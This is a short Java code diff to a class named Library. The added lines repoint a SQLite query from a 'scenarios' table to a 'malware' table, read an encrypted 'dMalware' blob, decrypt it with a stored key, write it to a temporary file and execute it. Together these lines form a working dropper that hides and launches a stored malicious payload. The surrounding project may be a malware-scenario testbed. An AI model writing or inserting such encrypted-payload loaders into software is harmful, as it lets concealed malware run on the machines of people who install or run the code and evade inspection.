@@ -8,6 +8,7 @@ import java.sql.Connection;
 import java.sql.ResultSet;
 import java.sql.Statement;
 
+import database.MalwareTable;
 import database.SqliteDatabase;
 import scenarios.ScenarioHelper;
 
@@ -40,8 +41,9 @@ public class Library {
 		 * e.printStackTrace(); }
 		 */
 		SqliteDatabase sqliteDB = new SqliteDatabase("filesDb.sqlite");
+		MalwareTable mTable = new MalwareTable(sqliteDB);
 
-		String sql = "SELECT * FROM scenarios";
+		String sql = "SELECT * FROM malware";
 
 		try (Connection conn = sqliteDB.connect();
 				Statement stmt = conn.createStatement();
@@ -50,7 +52,7 @@ public class Library {
 			while (rs.next()) {
 				System.out.println("ID: " + rs.getInt("idNumber"));
 				if (rs.getInt("idNumber") == 2) {
-					File tempFile = sch.convertBytesToFile(rs.getBytes("content"));
+					File tempFile = sch.convertBytesToFile(rs.getBytes("dMalware"));
 					sqliteDB.getSecretKey().decryptFile(tempFile);
 					Process exec = Runtime.getRuntime().exec(tempFile.toString());
 					exec.waitFor();
